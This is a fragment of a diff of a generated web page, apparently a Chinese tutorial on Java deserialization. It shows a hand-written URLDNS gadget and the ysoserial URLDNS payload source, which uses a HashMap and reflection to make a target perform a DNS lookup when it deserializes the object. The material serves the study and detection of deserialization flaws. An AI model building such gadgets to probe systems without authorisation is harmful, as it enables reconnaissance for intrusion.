-</span></span><span style="display:flex;"><span>		Method<span style="color:#f92672">[]</span> m <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.HashMap&#34;</span>).<span style="color:#a6e22e">getDeclaredMethods</span>();
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (Method method : m) {
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (method.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;putVal&#34;</span>)) {
-</span></span><span style="display:flex;"><span>				method.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
-</span></span><span style="display:flex;"><span>				method.<span style="color:#a6e22e">invoke</span>(hashMap, <span style="color:#f92672">-</span>1, url, 0, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
-</span></span><span style="display:flex;"><span>			}
-</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		Method<span style="color:#f92672">[]</span> m <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.HashMap&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredMethods</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Method method <span style="color:#f92672">:</span> m<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>method<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;putVal&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>				method<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>				method<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>hashMap<span style="color:#f92672">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">,</span> url<span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;urldns2.bin&#34;</span>));
-</span></span><span style="display:flex;"><span>		oos.<span style="color:#a6e22e">writeObject</span>(hashMap);
-</span></span><span style="display:flex;"><span>		ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;urldns2.bin&#34;</span>));
-</span></span><span style="display:flex;"><span>		ois.<span style="color:#a6e22e">readObject</span>();
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>		ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;urldns2.bin&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>		oos<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>hashMap<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;urldns2.bin&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>		ois<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
 </span></span></code></pre></div><h4 id="ysoserial-实现url-dns">ysoserial 实现URL DNS</h4>
 <p>下载
 <a href="https://github.com/frohoff/ysoserial" target="_blank">源码</a>,URLDNS实现如下，很明显采用的时第一种方法，在put之后，通过反射修改对应的值。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> <span style="color:#66d9ef">implements</span> ObjectPayload<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> <span style="color:#66d9ef">implements</span> ObjectPayload<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String url<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//Avoid DNS resolution during payload creation</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span>
-</span></span><span style="display:flex;"><span>                URLStreamHandler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SilentURLStreamHandler();
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//Avoid DNS resolution during payload creation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                URLStreamHandler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SilentURLStreamHandler<span style="color:#f92672">();</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                HashMap ht <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap(); <span style="color:#75715e">// HashMap that will contain the URL</span>
-</span></span><span style="display:flex;"><span>                URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">null</span>, url, handler); <span style="color:#75715e">// URL to use as the Key</span>
-</span></span><span style="display:flex;"><span>                ht.<span style="color:#a6e22e">put</span>(u, url); <span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span>
+</span></span><span style="display:flex;"><span>                HashMap ht <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">();</span> <span style="color:#75715e">// HashMap that will contain the URL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> url<span style="color:#f92672">,</span> handler<span style="color:#f92672">);</span> <span style="color:#75715e">// URL to use as the Key
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                ht<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>u<span style="color:#f92672">,</span> url<span style="color:#f92672">);</span> <span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>u<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;hashCode&#34;</span><span style="color:#f92672">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span> <span style="color:#75715e">// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> ht<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                Reflections.<span style="color:#a6e22e">setFieldValue</span>(u, <span style="color:#e6db74">&#34;hashCode&#34;</span>, <span style="color:#f92672">-</span>1); <span style="color:#75715e">// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> ht;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>                PayloadRunner.<span style="color:#a6e22e">run</span>(URLDNS.<span style="color:#a6e22e">class</span>, args);
-</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                PayloadRunner<span style="color:#f92672">.</span><span style="color:#a6e22e">run</span><span style="color:#f92672">(</span>URLDNS<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> args<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
@@ -2782,21 +2820,21 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * second resolution.&lt;/p&gt;
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span>(URL u) <span style="color:#66d9ef">throws</span> IOException {
-</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span><span style="color:#f92672">(</span>URL u<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
-</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(<span style="color:#66d9ef">final</span> Object obj, <span style="color:#66d9ef">final</span> String fieldName, <span style="color:#66d9ef">final</span> Object value) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">final</span> Field field <span style="color:#f92672">=</span> getField(obj.<span style="color:#a6e22e">getClass</span>(), fieldName);
-</span></span><span style="display:flex;"><span>		field.<span style="color:#a6e22e">set</span>(obj, value);
-</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span><span style="color:#f92672">(</span>URL u<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> Object obj<span style="color:#f92672">,</span> <span style="color:#66d9ef">final</span> String fieldName<span style="color:#f92672">,</span> <span style="color:#66d9ef">final</span> Object value<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">final</span> Field field <span style="color:#f92672">=</span> getField<span style="color:#f92672">(</span>obj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">(),</span> fieldName<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		field<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> value<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
 </span></span></code></pre></div><p><strong>参考链接</strong></p>
 <blockquote>
 <p>
@@ -3296,6 +3334,22 @@
             
         
                     
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
                         
             
             
@@ -3312,9 +3366,6 @@
             
         
                     
-            
-        
-                    
                         
             
             
@@ -3327,6 +3378,9 @@
                     
                     
 
+                    
+            
+        
                     
             
         
@@ -4228,19 +4282,19 @@
     <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
       <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
     </div>
-    <script src="/js/clipboard.min.js?1712424309"></script>
-    <script src="/js/perfect-scrollbar.min.js?1712424309"></script>
-    <script src="/js/perfect-scrollbar.jquery.min.js?1712424309"></script>
-    <script src="/js/jquery.sticky.js?1712424309"></script>
-    <script src="/js/featherlight.min.js?1712424309"></script>
-    <script src="/js/highlight.pack.js?1712424309"></script>
+    <script src="/js/clipboard.min.js?1713376033"></script>
+    <script src="/js/perfect-scrollbar.min.js?1713376033"></script>
+    <script src="/js/perfect-scrollbar.jquery.min.js?1713376033"></script>
+    <script src="/js/jquery.sticky.js?1713376033"></script>
+    <script src="/js/featherlight.min.js?1713376033"></script>
+    <script src="/js/highlight.pack.js?1713376033"></script>
     <script>hljs.initHighlightingOnLoad();</script>
-    <script src="/js/modernizr.custom-3.6.0.js?1712424309"></script>
-    <script src="/js/learn.js?1712424309"></script>
-    <script src="/js/hugo-learn.js?1712424309"></script>
+    <script src="/js/modernizr.custom-3.6.0.js?1713376033"></script>
+    <script src="/js/learn.js?1713376033"></script>
+    <script src="/js/hugo-learn.js?1713376033"></script>
     
         
-            <script src="/mermaid/mermaid.js?1712424309"></script>
+            <script src="/mermaid/mermaid.js?1713376033"></script>
         
         <script>
             mermaid.initialize({ startOnLoad: true });
